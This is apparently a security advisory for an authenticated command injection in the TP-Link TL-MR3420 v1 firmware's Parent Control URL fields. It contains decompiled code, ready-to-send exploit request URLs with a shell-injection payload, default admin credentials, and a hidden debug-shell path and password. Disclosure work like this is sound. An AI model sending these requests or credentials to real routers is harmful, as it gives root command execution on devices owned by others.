# Command Injection Vulnerability in TP-Link TL-MR3420 v1 Parent Control URL Fields

## Overview

* Vendor: TP-Link
* Product: TL-MR3420
* Hardware Version: MR3420 v1
* Tested Firmware Version: `3.12.3 Build 110222 Rel.34500n Beta`
* Vulnerability Type: Authenticated Command Injection
* Affected Component: `httpd` Web Management Interface
* Affected Page: `/userRpm/ParentCtrlRpm.htm`
* Trigger Parameters: `url_0` to `url_7`
* Default Web Credential Used in Testing: `admin / admin`
* Impact: Remote command execution with the privilege of the `httpd` process, which is typically root on this device.

## Vulnerability Description

The Parent Control page accepts URL entries through the `url_0` to `url_7` parameters. These values are saved as Parent Control rules after passing through `swChkLegalDomain()`. However, the validation is insufficient and does not properly reject shell metacharacters such as `;`, `>`, and `#`.

When Parent Control is enabled or refreshed, the saved URL entries are written into `/tmp/wr841n/parent.sh`. The script is then executed by `system("sh /tmp/wr841n/parent.sh")`. Because the URL values are inserted into an iptables command without quoting or shell escaping, an authenticated attacker can inject shell commands through one of the URL fields.

## Vulnerability Details

The request handler reads the URL parameters and saves them:

```c
sprintf(s__1, "url_%d", n8);
s_2 = (char *)httpGetEnv(a1, s__1);
...
if ( !swChkLegalDomain(s_1) )
{
  n9000 = 9001;
  goto LABEL_61;
}
strncpy(dest, s_1, 0x1Eu);
...
v21 = swSetParentCtrlEntry(s_);
```

The saved values are later used in `refreshParentCtrlTbl` when the firmware generates the Parent Control shell script:

```c
::parentCtrlScript = (int)fopen("/tmp/wr841n/parent.sh", "wt");
```

The URL values are concatenated into a string:

```c
sprintf(&s__1[v12], "%s,", (const char *)(v10 + 31));
```

The resulting URL string is inserted into an iptables command without quotes:

```c
sprintf(
  s_1,
  "-i %s -m mac --mac-source %s -p tcp --dport 80 -m multiurl --urls %s -j RETURN",
  LanBridgeName_1,
  s__3,
  s__1);
fprintf((FILE *)::parentCtrlScript, "%s\n", s_);
```

Finally, the generated script is executed:

```c
fclose(parentCtrlScript);
return system("sh /tmp/wr841n/parent.sh");
```

The complete data flow is:

```text
/userRpm/ParentCtrlRpm.htm
  -> ParentCtrlRpmHtm
     -> httpGetEnv("url_0") ... httpGetEnv("url_7")
     -> swChkLegalDomain() insufficient validation
     -> swSetParentCtrlEntry()
     -> ucSetParentCtrlEntry()

/userRpm/ParentCtrlRpm.htm
  -> ParentCtrlRpmHtm
     -> swSetParentCtrlGlobalCfg()
     -> ucSetParentCtrlGlobalCfg()
     -> refreshParentCtrlTbl()
     -> fopen("/tmp/wr841n/parent.sh", "wt")
     -> sprintf(... "--urls %s ...", url value)
     -> system("sh /tmp/wr841n/parent.sh")
```

## Verification

The issue was verified on a physical TP-Link TL-MR3420 v1 device at `192.168.1.1`.

First, save a Parent Control rule with a crafted `url_0` value:

```text
http://192.168.1.1/userRpm/ParentCtrlRpm.htm?Save=Save&child_mac=AA-BB-CC-DD-EE-FF&url_comment=pc&url_0=%3Becho%20pc%3E%2Ftmp%2Fpc%3B%23&scheds_lists=255&enable=1&Changed=0&Page=1
```

Second, enable Parent Control to trigger rule refresh and script execution:

```text
http://192.168.1.1/userRpm/ParentCtrlRpm.htm?Save=Save&ctrl_enable=1&mode_choose=1&parent_mac_addr=2C-16-DB-AC-BA-AB&Page=1
```

The encoded `url_0` value decodes to:

```sh
;echo pc>/tmp/pc;#
```

The hidden debug shell was used only to confirm command execution:

```text
http://192.168.1.1/userRpmNatDebugRpm26525557/linux_cmdline.html
```

Hidden debug shell credential used during verification:

```text
Username: osteam
Password: 5up
```

The marker file was successfully created:

```sh
cat /tmp/pc
pc
```

<img width="1695" height="504" alt="image" src="https://github.com/user-attachments/assets/1c527ae5-aae8-49ad-9b39-8514c12578e5" />


## Conclusion

The TP-Link TL-MR3420 v1 firmware `3.12.3 Build 110222 Rel.34500n Beta` contains an authenticated command injection vulnerability in the Parent Control URL fields. The `url_0` to `url_7` values are saved from the Web interface and later written into a shell script without proper escaping before the script is executed by `system()`.
